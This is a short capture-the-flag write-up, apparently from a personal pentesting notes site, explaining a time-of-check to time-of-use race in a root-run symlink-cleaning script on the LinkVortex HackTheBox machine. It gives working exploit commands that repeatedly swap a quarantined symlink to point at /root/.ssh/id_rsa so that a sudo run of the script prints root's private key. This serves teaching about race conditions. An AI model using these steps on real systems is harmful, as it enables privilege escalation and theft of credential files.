---
layout: default
title: TOCTOU
permalink: /toctou/
---

# TOCTOU (Time-of-Check to Time-of-Use) 
This example is from the LinkVortex HTB machine.
Suppose we can execute the following code as root:
```
#!/bin/bash
QUAR_DIR="/var/quarantined"
if [ -z $CHECK_CONTENT ];then
CHECK_CONTENT=false
fi
LINK=$1
if ! [[ "$LINK" =~ \.png$ ]]; then
/usr/bin/echo "! First argument must be a png file !"
exit 2
fi
if /usr/bin/sudo /usr/bin/test -L $LINK;then
LINK_NAME=$(/usr/bin/basename $LINK)
LINK_TARGET=$(/usr/bin/readlink $LINK)
if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
/usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
/usr/bin/unlink $LINK
else
/usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
/usr/bin/mv $LINK $QUAR_DIR/
if $CHECK_CONTENT;then
/usr/bin/echo "Content:"
/usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
fi
fi
fi
```

The script takes a .png file as input, checks if it's a symbolic link, and inspects the link's target. If
the target points to sensitive directories like /etc or /root , it unlinks the file; otherwise, it moves
it to a quarantine folder ( /var/quarantined ). Once moved to quarantine and if the environment
variable CHECK_CONTENT is set to true , it prints the content of the linked file.
A race condition called TOCTOU (Time-of-Check to Time-of-Use) opens up here. After the symlink is
moved to quarantine, we can quickly swap the link target to point to a sensitive file such as
/etc/shadow or even a private key for root such as /root/.ssh/id_rsa . If we also set
CHECK_CONTENT=true , the script will read the sensitive file, bypassing the initial check!


Let's first create the directory and PNG file with a symlink target that will pass the initial check, like
/ok. This doesn't actually point to anything real, so it is considered a broken symlink, but we will
change its target later, so it doesn't matter.

```
mkdir -p exploit2/content/images/
ln -s /ok exploit2/content/images/key.png
zip -r -y exploit2.zip exploit2/
```
Then upload the zip file and execcute the following:
```
while true;do ln -sf /root/.ssh/id_rsa
/var/quarantined/key.png;done
```
Finally trigger the script:
```
export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /opt/ghost/content/images/key.png
```
